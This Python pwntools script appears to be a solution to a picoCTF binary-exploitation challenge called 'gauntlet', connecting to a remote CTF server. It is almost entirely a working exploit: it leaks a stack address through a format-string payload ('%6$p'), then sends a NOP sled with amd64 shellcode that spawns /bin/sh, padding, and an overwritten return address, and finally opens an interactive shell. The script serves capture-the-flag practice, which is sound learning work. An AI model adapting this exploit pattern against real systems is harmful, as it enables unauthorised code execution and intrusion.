#!/usr/bin/env python3

import pwn

gdbcmds = '''
c
'''

target = ['./gauntlet']
#pwn.context.terminal = ['tmux', 'splitw', '-v', '-p', '75']

#p = pwn.gdb.debug(target[0], gdbscript=gdbcmds)
#p = pwn.process(target[0])
p = pwn.remote('mercury.picoctf.net', 59636)


# Leak stack address
pwn.log.info("Doing initial stack leak")
# %p for leaking all, %6$p for a specific one
p.sendline('%6$p')
leak_addr = p.recv().strip()
pwn.log.info("Leak address: {}".format(leak_addr))
# <-- why the fuccque is this 0x10 off local i don't understand
leak_addr_with_offset = int(leak_addr, 16) - 344
pwn.log.info("Leak address with offset: {}".format(hex(leak_addr_with_offset)))

shellcode = b'\x90' * 10 + \
    pwn.asm(pwn.shellcraft.amd64.linux.sh(), os='linux', arch='amd64')

sploit = b''
sploit += shellcode
sploit += b'A' * (120-len(shellcode))
sploit += pwn.p64(leak_addr_with_offset)

# Sending exploit
pwn.log.info('Sending sploit')
p.sendline(sploit)

pwn.log.info('Going Interactive')
p.interactive()
